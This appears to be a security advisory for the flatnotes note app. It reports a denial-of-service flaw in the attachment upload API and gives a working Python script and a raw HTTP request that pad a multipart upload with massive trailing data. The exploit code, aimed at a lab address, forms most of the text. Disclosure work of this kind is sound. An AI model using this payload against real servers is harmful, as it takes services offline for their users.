### Description
Anyone who can log in to flatnotes and upload images through the function can cause DOS , which can prevent others from using it, other API interfaces from being accessed, and server DOS attacks

### Impact  
![image](https://github.com/user-attachments/assets/3f75eeb5-c5cd-4570-92b6-3e3b3fdab0f5)
### Proof of Concept 1
```
import requests

url = "http://192.168.137.11:8080/api/attachments"

headers = {
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoxNzMzMzg1NzA4fQ.GI9swgQd0pDSP0q4mgLc-pMV94xl4KE5_jJNenZChmc",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "multipart/form-data",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
    "Origin": "http://192.168.137.11:8080",
    "Referer": "http://192.168.137.11:8080/new",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoxNzMzMzg1NzA4fQ.GI9swgQd0pDSP0q4mgLc-pMV94xl4KE5_jJNenZChmc",
    "Connection": "keep-alive"
}

data = (
    "------WebKitFormBoundaryN20AMdlOKTaspeAy\r\n"
    "Content-Disposition: form-data; name=\"file\"; filename=\"sword.png\"\r\n"
    "Content-Type: image/png\r\n\r\n" + file_content+ "\r\n"
    "------WebKitFormBoundaryN20AMdlOKTaspeAy--"+"0123456789"*50000+"\r\n"
)

response = requests.post(url, headers=headers, data=data)

```

### Proof of Concept 2
```
POST /api/attachments HTTP/1.1
Host: 192.168.137.11:8080
Content-Length: 1440589
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoxNzMzMzg1NzA4fQ.GI9swgQd0pDSP0q4mgLc-pMV94xl4KE5_jJNenZChmc
Accept-Language: zh-CN,zh;q=0.9
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryN20AMdlOKTaspeAy
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Origin: http://192.168.137.11:8080
Referer: http://192.168.137.11:8080/new
Accept-Encoding: gzip, deflate, br
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoxNzMzMzg1NzA4fQ.GI9swgQd0pDSP0q4mgLc-pMV94xl4KE5_jJNenZChmc
Connection: keep-alive

------WebKitFormBoundaryN20AMdlOKTaspeAy
Content-Disposition: form-data; name="file"; filename="sword.png"
Content-Type: image/png

PNG
ND®B`
------WebKitFormBoundaryN20AMdlOKTaspeAy--
1234567890123456789012345678901234567890123456712345678901234567890123456789012345678901234567123456789012345678901234567890123456789012345671234567890123456789012345678901234567890123456712345678901234567890123456789012345678901234567123456789012345678901234567890123456789012345671234567890123456789012345678901234567890123456712345678901234567890123456789012345678901234567[attenation:A large amount of useless data]
```
### Attack Result 
![image](https://github.com/user-attachments/assets/c76d1da4-93d8-4a22-9a86-115d65c51a1e)




### refer 
[Github project](https://github.com/dullage/flatnotes)  
[origin issue](https://github.com/dullage/flatnotes/issues/259)

